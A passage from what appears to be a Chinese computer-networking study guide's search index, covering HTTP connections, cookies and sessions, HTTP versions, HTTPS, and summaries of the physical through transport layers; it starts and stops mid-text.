操作，就建立一次连接，任务结束就中断连接。当客户端浏览器访问的某个 HTML 或其他类型的 Web 页中包含有其他的 Web 资源（如 JavaScript 文件、图像文件、CSS 文件等），每遇到这样一个 Web 资源，浏览器就会重新建立一个 HTTP 会话。\n而从 HTTP/1.1 起，默认使用长连接，用以保持连接特性。使用长连接的 HTTP 协议，会在响应头加入这行代码：\nConnection:keep-alive 在使用长连接的情况下，当一个网页打开完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接不会关闭，客户端再次访问这个服务器时，会继续使用这一条已经建立的连接。Keep-Alive 不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如 Apache）中设定这个时间。实现长连接需要客户端和服务端都支持长连接。\nHTTP 协议的长连接和短连接，实质上是 TCP 协议的长连接和短连接。\n—— 《HTTP 长连接、短连接究竟是什么？》\n九 HTTP 是不保存状态的协议,如何保存用户状态?    HTTP 是一种不保存状态，即无状态（stateless）协议。也就是说 HTTP 协议自身不对请求和响应之间的通信状态进行保存。那么我们保存用户状态呢？Session 机制的存在就是为了解决这个问题，Session 的主要作用就是通过服务端记录用户的状态。典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了（一般情况下，服务器会在一定时间内保存这个 Session，过了时间限制，就会销毁这个 Session）。\n在服务端保存 Session 的方法很多，最常用的就是内存和数据库(比如是使用内存数据库 redis 保存)。既然 Session 存放在服务器端，那么我们如何实现 Session 跟踪呢？大部分情况下，我们都是通过在 Cookie 中附加一个 Session ID 来方式来跟踪。\nCookie 被禁用怎么办?\n最常用的就是利用 URL 重写把 Session ID 直接附加在 URL 路径的后面。\n十 Cookie 的作用是什么?和 Session 有什么区别？    Cookie 和 Session 都是用来跟踪浏览器用户身份的会话方式，但是两者的应用场景不太一样。\nCookie 一般用来保存用户信息 比如 ① 我们在 Cookie 中保存已经登录过得用户信息，下次访问网站的时候页面可以自动帮你登录的一些基本信息给填了；② 一般的网站都会有保持登录也就是说下次你再访问网站的时候就不需要重新登录了，这是因为用户登录的时候我们可以存放了一个 Token 在 Cookie 中，下次登录的时候只需要根据 Token 值来查找用户即可(为了安全考虑，重新登录一般要将 Token 重写)；③ 登录一次网站后访问网站其他页面不需要重新登录。Session 的主要作用就是通过服务端记录用户的状态。 典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了。\nCookie 数据保存在客户端(浏览器端)，Session 数据保存在服务器端。\nCookie 存储在客户端中，而 Session 存储在服务器上，相对来说 Session 安全性更高。如果要在 Cookie 中存储一些敏感信息，不要直接写入 Cookie 中，最好能将 Cookie 信息加密然后使用到的时候再去服务器端解密。\n十一 HTTP 1.0 和 HTTP 1.1 的主要区别是什么?     这部分回答引用这篇文章 https://mp.weixin.qq.com/s/GICbiyJpINrHZ41u_4zT-A? 的一些内容。\n HTTP1.0 最早在网页中使用是在 1996 年，那个时候只是使用一些较为简单的网页上和网络请求上，而 HTTP1.1 则在 1999 年才开始广泛应用于现在的各大浏览器网络请求中，同时 HTTP1.1 也是当前使用最为广泛的 HTTP 协议。 主要区别主要体现在：\n 长连接 : 在 HTTP/1.0 中，默认使用的是短连接，也就是说每次请求都要重新建立一次连接。HTTP 是基于 TCP/IP 协议的,每一次建立或者断开连接都需要三次握手四次挥手的开销，如果每次请求都要这样的话，开销会比较大。因此最好能维持一个长连接，可以用个长连接来发多个请求。HTTP 1.1 起，默认使用长连接 ,默认开启 Connection： keep-alive。 HTTP/1.1 的持续连接有非流水线方式和流水线方式 。流水线方式是客户在收到 HTTP 的响应报文之前就能接着发送新的请求报文。与之相对应的非流水线方式是客户在收到前一个响应后才能发送下一个请求。 错误状态响应码 :在 HTTP1.1 中新增了 24 个错误状态响应码，如 409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。 缓存处理 :在 HTTP1.0 中主要使用 header 里的 If-Modified-Since,Expires 来做为缓存判断的标准，HTTP1.1 则引入了更多的缓存控制策略例如 Entity tag，If-Unmodified-Since, If-Match, If-None-Match 等更多可供选择的缓存头来控制缓存策略。 带宽优化及网络连接的使用 :HTTP1.0 中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1 则在请求头引入了 range 头域，它允许只请求资源的某个部分，即返回码是 206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。  十二 URI 和 URL 的区别是什么?     URI(Uniform Resource Identifier) 是统一资源标志符，可以唯一标识一个资源。 URL(Uniform Resource Locator) 是统一资源定位符，可以提供该资源的路径。它是一种具体的 URI，即 URL 可以用来标识一个资源，而且还指明了如何 locate 这个资源。  URI 的作用像身份证号一样，URL 的作用更像家庭住址一样。URL 是一种具体的 URI，它不仅唯一标识资源，而且还提供了定位该资源的信息。\n十三 HTTP 和 HTTPS 的区别？     端口 ：HTTP 的 URL 由“http://”起始且默认使用端口80，而HTTPS的URL由“https://”起始且默认使用端口443。 安全性和资源消耗： HTTP 协议运行在 TCP 之上，所有传输的内容都是明文，客户端和服务器端都无法验证对方的身份。HTTPS 是运行在 SSL/TLS 之上的 HTTP 协议，SSL/TLS 运行在 TCP 之上。所有传输的内容都经过加密，加密采用对称加密，但对称加密的密钥用服务器方的证书进行了非对称加密。所以说，HTTP 安全性没有 HTTPS 高，但是 HTTPS 比 HTTP 耗费更多服务器资源。  对称加密：密钥只有一个，加密解密为同一个密码，且加解密速度快，典型的对称加密算法有 DES、AES 等； 非对称加密：密钥成对出现（且根据公钥无法推知私钥，根据私钥也无法推知公钥），加密解密使用不同密钥（公钥加密需要私钥解密，私钥加密需要公钥解密），相对对称加密速度较慢，典型的非对称加密算法有 RSA、DSA 等。    建议    非常推荐大家看一下 《图解 HTTP》 这本书，这本书页数不多，但是内容很是充实，不管是用来系统的掌握网络方面的一些知识还是说纯粹为了应付面试都有很大帮助。下面的一些文章只是参考。大二学习这门课程的时候，我们使用的教材是 《计算机网络第七版》（谢希仁编著），不推荐大家看这本教材，书非常厚而且知识偏理论，不确定大家能不能心平气和的读完。\n参考     https://blog.csdn.net/qq_16209077/article/details/52718250 https://blog.csdn.net/zixiaomuwu/article/details/60965466 https://blog.csdn.net/turn__back/article/details/73743641 https://mp.weixin.qq.com/s/GICbiyJpINrHZ41u_4zT-A?  "},{"id":374,"href":"/cs-basics/network/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/","title":"计算机网络知识总结","parent":"network","content":"本文是我在大二学习计算机网络期间整理， 大部分内容都来自于谢希仁老师的《计算机网络》这本书。\n为了内容更容易理解，我对之前的整理进行了一波重构，并配上了一些相关的示意图便于理解。\n 1. 计算机网络概述  1.1. 基本术语 1.2. 重要知识点总结   2. 物理层（Physical Layer）  2.1. 基本术语 2.2. 重要知识点总结 2.3. 补充  2.3.1. 物理层主要做啥？ 2.3.2. 几种常用的信道复用技术 2.3.3. 几种常用的宽带接入技术，主要是 ADSL 和 FTTx     3. 数据链路层（Data Link Layer）  3.1. 基本术语 3.2. 重要知识点总结 3.3. 补充   4. 网络层（Network Layer）  4.1. 基本术语 4.2. 重要知识点总结   5. 传输层（Transport Layer）  5.1. 基本术语 5.2. 重要知识点总结 5.3. 补充（重要）   6. 应用层（Application Layer）  6.1. 基本术语 6.2. 重要知识点总结 6.3. 补充（重要）    1. 计算机网络概述    1.1. 基本术语     结点 （node） ：网络中的结点可以是计算机，集线器，交换机或路由器等。 链路（link ） : 从一个结点到另一个结点的一段物理线路。中间没有任何其他交点。 主机（host） ：连接在因特网上的计算机。 ISP（Internet Service Provider） ：因特网服务提供者（提供商）。  IXP（Internet eXchange Point） ： 互联网交换点 IXP 的主要作用就是允许两个网络直接相连并交换分组，而不需要再通过第三个网络来转发分组。  https://labs.ripe.net/Members/fergalc/ixp-traffic-during-stratos-skydive\nRFC(Request For Comments) ：意思是“请求评议”，包含了关于 Internet 几乎所有的重要的文字资料。 广域网 WAN（Wide Area Network） ：任务是通过长距离运送主机发送的数据。 城域网 MAN（Metropolitan Area Network）：用来将多个局域网进行互连。 局域网 LAN（Local Area Network） ： 学校或企业大多拥有多个互连的局域网。  http://conexionesmanwman.blogspot.com/\n个人区域网 PAN（Personal Area Network） ：在个人工作的地方把属于个人使用的电子设备用无线技术连接起来的网络 。  https://www.itrelease.com/2018/07/advantages-and-disadvantages-of-personal-area-network-pan/\n分组（packet ） ：因特网中传送的数据单元。由首部 header 和数据段组成。分组又称为包，首部可称为包头。 存储转发（store and forward ） ：路由器收到一个分组，先检查分组是否正确，并过滤掉冲突包错误。确定包正确后，取出目的地址，通过查找表找到想要发送的输出端口地址，然后将该包发送出去。  带宽（bandwidth） ：在计算机网络中，表示在单位时间内从网络中的某一点到另一点所能通过的“最高数据率”。常用来表示网络的通信线路所能传送数据的能力。单位是“比特每秒”，记为 b/s。 吞吐量（throughput ） ：表示在单位时间内通过某个网络（或信道、接口）的数据量。吞吐量更经常地用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。吞吐量受网络的带宽或网络的额定速率的限制。  1.2. 重要知识点总结     计算机网络（简称网络）把许多计算机连接在一起，而互联网把许多网络连接在一起，是网络的网络。 小写字母 i 开头的 internet（互联网）是通用名词，它泛指由多个计算机网络相互连接而成的网络。在这些网络之间的通信协议（即通信规则）可以是任意的。大写字母 I 开头的 Internet（互联网）是专用名词，它指全球最大的，开放的，由众多网络相互连接而成的特定的互联网，并采用 TCP/IP 协议作为通信规则，其前身为 ARPANET。Internet 的推荐译名为因特网，现在一般流行称为互联网。 路由器是实现分组交换的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能。分组交换采用存储转发技术，表示把一个报文（要发送的整块数据）分为几个分组后再进行传送。在发送报文之前，先把较长的报文划分成为一个个更小的等长数据段。在每个数据端的前面加上一些由必要的控制信息组成的首部后，就构成了一个分组。分组又称为包。分组是在互联网中传送的数据单元，正是由于分组的头部包含了诸如目的地址和源地址等重要控制信息，每一个分组才能在互联网中独立的选择传输路径，并正确地交付到分组传输的终点。 互联网按工作方式可划分为边缘部分和核心部分。主机在网络的边缘部分，其作用是进行信息处理。由大量网络和连接这些网络的路由器组成核心部分，其作用是提供连通性和交换。 计算机通信是计算机中进程（即运行着的程序）之间的通信。计算机网络采用的通信方式是客户-服务器方式（C/S 方式）和对等连接方式（P2P 方式）。 客户和服务器都是指通信中所涉及的应用进程。客户是服务请求方，服务器是服务提供方。 按照作用范围的不同，计算机网络分为广域网 WAN，城域网 MAN，局域网 LAN，个人区域网 PAN。 计算机网络最常用的性能指标是：速率，带宽，吞吐量，时延（发送时延，处理时延，排队时延），时延带宽积，往返时间和信道利用率。 网络协议即协议，是为进行网络中的数据交换而建立的规则。计算机网络的各层以及其协议集合，称为网络的体系结构。 五层体系结构由应用层，运输层，网络层（网际层），数据链路层，物理层组成。运输层最主要的协议是 TCP 和 UDP 协议，网络层最重要的协议是 IP 协议。  下面的内容会介绍计算机网络的五层体系结构：物理层+数据链路层+网络层（网际层）+运输层+应用层。\n2. 物理层（Physical Layer）    2.1. 基本术语     数据（data） :运送消息的实体。 信号（signal） ：数据的电气的或电磁的表现。或者说信号是适合在传输介质上传输的对象。 码元（ code） ：在使用时间域（或简称为时域）的波形来表示数字信号时，代表不同离散数值的基本波形。 单工（simplex ） : 只能有一个方向的通信而没有反方向的交互。 半双工（half duplex ） ：通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)。 全双工（full duplex） : 通信的双方可以同时发送和接收信息。  失真：失去真实性，主要是指接受到的信号和发送的信号不同，有磨损和衰减。影响失真程度的因素：1.码元传输速率 2.信号传输距离 3.噪声干扰 4.传输媒体质量  奈氏准则 : 在任何信道中，码元的传输的效率是有上限的，传输速率超过此上限，就会出现严重的码间串扰问题，使接收端对码元的判决（即识别）成为不可能。 香农定理 ：在带宽受限且有噪声的信道中，为了不产生误差，信息的数据传输速率有上限值。 基带信号（baseband signal） : 来自信源的信号。指没有经过调制的数字信号或模拟信号。 带通（频带）信号（bandpass signal） ：把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输（即仅在一段频率范围内能够通过信道），这里调制过后的信号就是带通信号。 调制（modulation ） : 对信号源的信息进行处理后加到载波信号上，使其变为适合在信道传输的形式的过程。 信噪比（signal-to-noise ratio ） : 指信号的平均功率和噪声的平均功率之比，记为 S/N。信噪比（dB）=10*log10（S/N）。 信道复用（channel multiplexing ） ：指多个用户共享同一个信道。（并不一定是同时）。  比特率（bit rate ） ：单位时间（每秒）内传送的比特数。 波特率（baud rate） ：单位时间载波调制状态改变的次数。针对数据信号对载波的调制速率。 复用（multiplexing） ：共享信道的方法。 ADSL（Asymmetric Digital Subscriber Line ） ：非对称数字用户线。 光纤同轴混合网（HFC 网） :在目前覆盖范围很广的有线电视网的基础上开发的一种居民宽带接入网  2.2. 重要知识点总结     物理层的主要任务就是确定与传输媒体接口有关的一些特性，如机械特性，电气特性，功能特性，过程特性。 一个数据通信系统可划分为三大部分，即源系统，传输系统，目的系统。源系统包括源点（或源站，信源）和发送器，目的系统包括接收器和终点。 通信的目的是传送消息。如话音，文字，图像等都是消息，数据是运送消息的实体。信号则是数据的电器或电磁的表现。 根据信号中代表消息的参数的取值方式不同，信号可分为模拟信号（或连续信号）和数字信号（或离散信号）。在使用时间域（简称时域）的波形表示数字信号时，代表不同离散数值的基本波形称为码元。 根据双方信息交互的方式，通信可划分为单向通信（或单工通信），双向交替通信（或半双工通信），双向同时通信（全双工通信）。 来自信源的信号称为基带信号。信号要在信道上传输就要经过调制。调制有基带调制和带通调制之分。最基本的带通调制方法有调幅，调频和调相。还有更复杂的调制方法，如正交振幅调制。 要提高数据在信道上的传递速率，可以使用更好的传输媒体，或使用先进的调制技术。但数据传输速率不可能任意被提高。 传输媒体可分为两大类，即导引型传输媒体（双绞线，同轴电缆，光纤）和非导引型传输媒体（无线，红外，大气激光）。 了有效利用光纤资源，在光纤干线和用户之间广泛使用无源光网络 PON。无源光网络无需配备电源，其长期运营成本和管理成本都很低。最流行的无源光网络是以太网无源光网络 EPON 和吉比特无源光网络 GPON。  2.3. 补充    2.3.1. 物理层主要做啥？    物理层主要做的事情就是 透明地传送比特流。也可以将物理层的主要任务描述为确定与传输媒体的接口的一些特性，即：机械特性（接口所用接线器的一些物理属性如形状尺寸），电气特性（接口电缆的各条线上出现的电压的范围），功能特性（某条线上出现的某一电平的电压的意义），过程特性（对于不同功能能的各种可能事件的出现顺序）。\n物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。 现有的计算机网络中的硬件设备和传输媒体的种类非常繁多，而且通信手段也有许多不同的方式。物理层的作用正是尽可能地屏蔽掉这些传输媒体和通信手段的差异，使物理层上面的数据链路层感觉不到这些差异，这样就可以使数据链路层只考虑完成本层的协议和服务，而不必考虑网络的具体传输媒体和通信手段是什么。\n2.3.2. 几种常用的信道复用技术     频分复用(FDM) ：所有用户在同样的时间占用不同的带宽资源。 时分复用（TDM） ：所有用户在不同的时间占用同样的频带宽度（分时不分频）。 统计时分复用 (Statistic TDM) ：改进的时分复用，能够明显提高信道的利用率。 码分复用(CDM) ： 用户使用经过特殊挑选的不同码型，因此各用户之间不会造成干扰。这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。 波分复用( WDM) ：波分复用就是光的频分复用。  2.3.3. 几种常用的宽带接入技术，主要是 ADSL 和 FTTx    用户到互联网的宽带接入方法有非对称数字用户线 ADSL（用数字技术对现有的模拟电话线进行改造，而不需要重新布线。ASDL 的快速版本是甚高速数字用户线 VDSL。），光纤同轴混合网 HFC（是在目前覆盖范围很广的有线电视网的基础上开发的一种居民宽带接入网）和 FTTx（即光纤到······）。\n3. 数据链路层（Data Link Layer）    3.1. 基本术语     链路（link） ：一个结点到相邻结点的一段物理链路。 数据链路（data link） ：把实现控制数据运输的协议的硬件和软件加到链路上就构成了数据链路。 循环冗余检验 CRC（Cyclic Redundancy Check） ：为了保证数据传输的可靠性，CRC 是数据链路层广泛使用的一种检错技术。 帧（frame） ：一个数据链路层的传输单元，由一个数据链路层首部和其携带的封包所组成协议数据单元。 MTU（Maximum Transfer Uint ） ：最大传送单元。帧的数据部分的的长度上限。 误码率 BER（Bit Error Rate ） ：在一段时间内，传输错误的比特占所传输比特总数的比率。 PPP（Point-to-Point Protocol ） ：点对点协议。即用户计算机和 ISP 进行通信时所使用的数据链路层协议。以下是 PPP 帧的示意图：  MAC 地址（Media Access Control 或者 Medium Access Control） ：意译为媒体访问控制，或称为物理地址、硬件地址，用来定义网络设备的位置。在 OSI 模型中，第三层网络层负责 IP 地址，第二层数据链路层则负责 MAC 地址。因此一个主机会有一个 MAC 地址，而每个网络位置会有一个专属于它的 IP 地址 。地址是识别某个系统的重要标识符，“名字指出我们所要寻找的资源，地址指出资源所在的地方，路由告诉我们如何到达该处。  网桥（bridge） ：一种用于数据链路层实现中继，连接两个或多个局域网的网络互连设备。 交换机（switch ） ：广义的来说，交换机指的是一种通信系统中完成信息交换的设备。这里工作在数据链路层的交换机指的是交换式集线器，其实质是一个多接口的网桥  3.2. 重要知识点总结     链路是从一个结点到相邻节点的一段物理链路，数据链路则在链路的基础上增加了一些必要的硬件（如网络适配器）和软件（如协议的实现） 数据链路层使用的主要是点对点信道和广播信道两种。 数据链路层传输的协议数据单元是帧。数据链路层的三个基本问题是：封装成帧，透明传输和差错检测 循环冗余检验 CRC 是一种检错方法，而帧检验序列 FCS 是添加在数据后面的冗余码 点对点协议 PPP 是数据链路层使用最多的一种协议，它的特点是：简单，只检测差错而不去纠正差错，不使用序号，也不进行流量控制，可同时支持多种网络层协议 PPPoE 是为宽带上网的主机使用的链路层协议 局域网的优点是：具有广播功能，从一个站点可方便地访问全网；便于系统的扩展和逐渐演变；提高了系统的可靠性，可用性和生存性。 计算机与外接局域网通信需要通过通信适配器（或网络适配器），它又称为网络接口卡或网卡。计算器的硬件地址就在适配器的 ROM 中。 以太网采用的无连接的工作方式，对发送的数据帧不进行编号，也不要求对方发回确认。目的站收到有差错帧就把它丢掉，其他什么也不做 以太网采用的协议是具有冲突检测的载波监听多点接入 CSMA/CD。协议的特点是：发送前先监听，边发送边监听，一旦发现总线上出现了碰撞，就立即停止发送。然后按照退避算法等待一段随机时间后再次发送。 因此，每一个站点在自己发送数据之后的一小段时间内，存在这遭遇碰撞的可能性。以太网上的各站点平等的争用以太网信道 以太网的适配器具有过滤功能，它只接收单播帧，广播帧和多播帧。 使用集线器可以在物理层扩展以太网（扩展后的以太网仍然是一个网络）  3.3. 补充     数据链路层的点对点信道和广播信道的特点，以及这两种信道所使用的协议（PPP 协议以及 CSMA/CD 协议）的特点 数据链路层的三个基本问题：封装成帧，透明传输，差错检测 以太网的 MAC 层硬件地址 适配器，转发器，集线器，网桥，以太网交换机的作用以及适用场合  4. 网络层（Network Layer）    4.1. 基本术语     虚电路（Virtual Circuit） : 在两个终端设备的逻辑或物理端口之间，通过建立的双向的透明传输通道。虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发方式传送，而并不是真正建立了一条物理连接。 IP（Internet Protocol ） : 网际协议 IP 是 TCP/IP 体系中两个最主要的协议之一，是 TCP/IP 体系结构网际层的核心。配套的有 ARP，RARP，ICMP，IGMP。 ARP（Address Resolution Protocol） : 地址解析协议。地址解析协议 ARP 把 IP 地址解析为硬件地址。 ICMP（Internet Control Message Protocol ） ：网际控制报文协议 （ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告）。 子网掩码（subnet mask ） ：它是一种用来指明一个 IP 地址的哪些位标识的是主机所在的子网以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合 IP 地址一起使用。 CIDR（ Classless Inter-Domain Routing ）：无分类域间路由选择 （特点是消除了传统的 A 类、B 类和 C 类地址以及划分子网的概念，并使用各种长度的“网络前缀”(network-prefix)来代替分类地址中的网络号和子网号）。 默认路由（default route） ：当在路由表中查不到能到达目的地址的路由时，路由器选择的路由。默认路由还可以减小路由表所占用的空间和搜索路由表所用的时间。 路由选择算法（Virtual Circuit） ：路由选择协议的核心部分。因特网采用自适应的，分层次的路由选择协议。  4.2. 重要知识点总结     TCP/IP 协议中的网络层向上只提供简单灵活的，无连接的，尽最大努力交付的数据报服务。网络层不提供服务质量的承诺，不保证分组交付的时限所传送的分组可能出错，丢失，重复和失序。进程之间通信的可靠性由运输层负责 在互联网的交付有两种，一是在本网络直接交付不用经过路由器，另一种是和其他网络的间接交付，至少经过一个路由器，但最后一次一定是直接交付 分类的 IP 地址由网络号字段（指明网络）和主机号字段（指明主机）组成。网络号字段最前面的类别指明 IP 地址的类别。IP 地址是一种分等级的地址结构。IP 地址管理机构分配 IP 地址时只分配网络号，主机号由得到该网络号的单位自行分配。路由器根据目的主机所连接的网络号来转发分组。一个路由器至少连接到两个网络，所以一个路由器至少应当有两个不同的 IP 地址 IP 数据报分为首部和数据两部分。首部的前一部分是固定长度，共 20 字节，是所有 IP 数据包必须具有的（源地址，目的地址，总长度等重要地段都固定在首部）。一些长度可变的可选字段固定在首部的后面。IP 首部中的生存时间给出了 IP 数据报在互联网中所能经过的最大路由器数。可防止 IP 数据报在互联网中无限制的兜圈子。 地址解析协议 ARP 把 IP 地址解析为硬件地址。ARP 的高速缓存可以大大减少网络上的通信量。因为这样可以使主机下次再与同样地址的主机通信时，可以直接从高速缓存中找到所需要的硬件地址而不需要再去广播方式发送 ARP 请求分组 无分类域间路由选择 CIDR 是解决目前 IP 地址紧缺的一个好办法。CIDR 记法把 IP 地址后面加上斜线“/”，然后写上前缀所所占的位数。前缀（或网络前缀用来指明网络），前缀后面的部分是后缀，用来指明主机。CIDR 把前缀都相同的连续的 IP 地址组成一个“CIDR 地址块”，IP 地址分配都以 CIDR 地址块为单位。 网际控制报文协议是 IP 层的协议。ICMP 报文作为 IP 数据报的数据，加上首部后组成 IP 数据报发送出去。使用 ICMP 数据报并不是为了实现可靠传输。ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告。ICMP 报文的种类有两种 ICMP 差错报告报文和 ICMP 询问报文。 要解决 IP 地址耗尽的问题，最根本的办法是采用具有更大地址空间的新版本 IP 协议-IPv6。 IPv6 所带来的变化有 ① 更大的地址空间（采用 128 位地址）② 灵活的首部格式 ③ 改进的选项 ④ 支持即插即用 ⑤ 支持资源的预分配 ⑥IPv6 的首部改为 8 字节对齐。 虚拟专用网络 VPN 利用公用的互联网作为本机构专用网之间的通信载体。VPN 内使用互联网的专用地址。一个 VPN 至少要有一个路由器具有合法的全球 IP 地址，这样才能和本系统的另一个 VPN 通过互联网进行通信。所有通过互联网传送的数据都需要加密。 MPLS 的特点是：① 支持面向连接的服务质量 ② 支持流量工程，平衡网络负载 ③ 有效的支持虚拟专用网 VPN。MPLS 在入口节点给每一个 IP 数据报打上固定长度的“标记”，然后根据标记在第二层（链路层）用硬件进行转发（在标记交换路由器中进行标记交换），因而转发速率大大加快。  5. 传输层（Transport Layer）    5.1. 基本术语     进程（process） ：指计算机中正在运行的程序实体。 应用进程互相通信 ：一台主机的进程和另一台主机中的一个进程交换数据的过程（另外注意通信真正的端点不是主机而是主机中的进程，也就是说端到端的通信是应用进程之间的通信）。 传输层的复用与分用 ：复用指发送方不同的进程都可以通过统一个运输层协议传送数据。分用指接收方的运输层在剥去报文的首部后能把这些数据正确的交付到目的应用进程。 TCP（Transmission Control Protocol） ：传输控制协议。 UDP（User Datagram Protocol） ：用户数据报协议。  端口（port） ：端口的目的是为了确认对方机器是那个进程在于自己进行交互，比如 MSN 和 QQ 的端口不同，如果没有端口就可能出现 QQ 进程和 MSN 交互错误。端口又称协议端口号。 停止等待协议（stop-and-wait） ：指发送方每发送完一个分组就停止发送，等待对方确认，在收到确认之后在发送下一个分组。 流量控制 : 就是让发送方的发送速率不要太快，既要让接收方来得及接收，也不要使网络发生拥塞。 拥塞控制 ：防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。  5.2. 重要知识点总结     运输层提供应用进程之间的逻辑通信，也就是说，运输层之间的通信并不是真正在两个运输层之间直接传输数据。运输层向应用层屏蔽了下面网络的细节（如网络拓补，所采用的路由选择协议等），它使应用进程之间看起来好像两个运输层实体之间有一条端到端的逻辑通信信道。 网络层为主机提供逻辑通信，而运输层为应用进程之间提供端到端的逻辑通信。 运输层的两个重要协议是用户数据报协议 UDP 和传输控制协议 TCP。按照 OSI 的术语，两个对等运输实体在通信时传送的数据单位叫做运输协议数据单元 TPDU（Transport Protocol Data Unit）。但在 TCP/IP 体系中，则根据所使用的协议是 TCP 或 UDP，分别称之为 TCP 报文段或 UDP 用户数据报。 UDP 在传送数据之前不需要先建立连接，远地主机在收到 UDP 报文后，不需要给出任何确认。虽然 UDP 不提供可靠交付，但在某些情况下 UDP 确是一种最有效的工作方式。 TCP 提供面向连接的服务。在传送数据之前必须先建立连接，数据传送结束后要释放连接。TCP 不提供广播或多播服务。由于 TCP 要提供可靠的，面向连接的传输服务，这一难以避免增加了许多开销，如确认，流量控制，计时器以及连接管理等。这不仅使协议数据单元的首部增大很多，还要占用许多处理机资源。 硬件端口是不同硬件设备进行交互的接口，而软件端口是应用层各种协议进程与运输实体进行层间交互的一种地址。UDP 和 TCP 的首部格式中都有源端口和目的端口这两个重要字段。当运输层收到 IP 层交上来的运输层报文时，就能够 根据其首部中的目的端口号把数据交付应用层的目的应用层。（两个进程之间进行通信不光要知道对方 IP 地址而且要知道对方的端口号(为了找到对方计算机中的应用进程)） 运输层用一个 16 位端口号标志一个端口。端口号只有本地意义，它只是为了标志计算机应用层中的各个进程在和运输层交互时的层间接口。在互联网的不同计算机中，相同的端口号是没有关联的。协议端口号简称端口。虽然通信的终点是应用进程，但只要把所发送的报文交到目的主机的某个合适端口，剩下的工作（最后交付目的进程）就由 TCP 和 UDP 来完成。 运输层的端口号分为服务器端使用的端口号（0~1023 指派给熟知端口，1024~49151 是登记端口号）和客户端暂时使用的端口号（49152~65535） UDP 的主要特点是 ① 无连接 ② 尽最大努力交付 ③ 面向报文 ④ 无拥塞控制 ⑤ 支持一对一，一对多，多对一和多对多的交互通信 ⑥ 首部开销小（只有四个字段：源端口，目的端口，长度和检验和） TCP 的主要特点是 ① 面向连接 ② 每一条 TCP 连接只能是一对一的 ③ 提供可靠交付 ④ 提供全双工通信 ⑤ 面向字节流 TCP 用主机的 IP 地址加上主机上的端口号作为 TCP 连接的端点。这样的端点就叫做套接字（socket）或插口。套接字用（IP 地址：端口号）来表示。每一条 TCP 连接唯一被通信两端的两个端点所确定。 停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。 为了提高传输效率，发送方可以不使用低效率的停止等待协议，而是采用流水线传输。流水线传输就是发送方可连续发送多个分组，不必每发完一个分组就停下来等待对方确认。这样可使信道上一直有数据不间断的在传送。这种传输方式可以明显提高信道利用率。 停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重转时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为自动重传请求 ARQ。另外在停止等待协议中若收到重复分组，就丢弃该分组，但同时还要发送确认。连续 ARQ 协议可提高信道利用率。发送维持一个发送窗口，凡位于发送窗口内的分组可连续发送出去，而不需要等待对方确认。接收方一般采用累积确认，对按序到达的最后一个分组发送确认，表明到这个分组位置的所有分组都已经正确收到了。 TCP 报文段的前 20 个字节是固定的，后面有 4n 字节是根据需要增加的选项。因此，TCP 首部的最小长度是 20 字节。 TCP 使用滑动窗口机制。发送窗口里面的序号表示允许发送的序号。发送窗口后沿的后面部分表示已发送且已收到确认，而发送窗口前沿的前面部分表示不允许发送。发送窗口后沿的变化情况有两种可能，即不动（没有收到新的确认）和前移（收到了新的确认）。发送窗口的前沿通常是不断向前移动的。一般来说，我们总是希望数据传输更快一些。但如果发送方把数据发送的过快，接收方就可能来不及接收，这就会造成数据的丢失。所谓流量控制就是让发送方的发送速率不要太快，要让接收方来得及接收。 在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。 为了进行拥塞控制，TCP 发送方要维持一个拥塞窗口 cwnd 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。 TCP 的拥塞控制采用了四种算法，即慢开始，拥塞避免，快重传和快恢复。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。 运输连接的三个阶段，即：连接建立，数据传送和连接释放。 主动发起 TCP 连接建立的应用进程叫做客户，而被动等待连接建立的应用进程叫做服务器。TCP 连接采用三报文握手机制。服务器要确认用户的连接请求，然后客户要对服务器的确认进行确认。 TCP 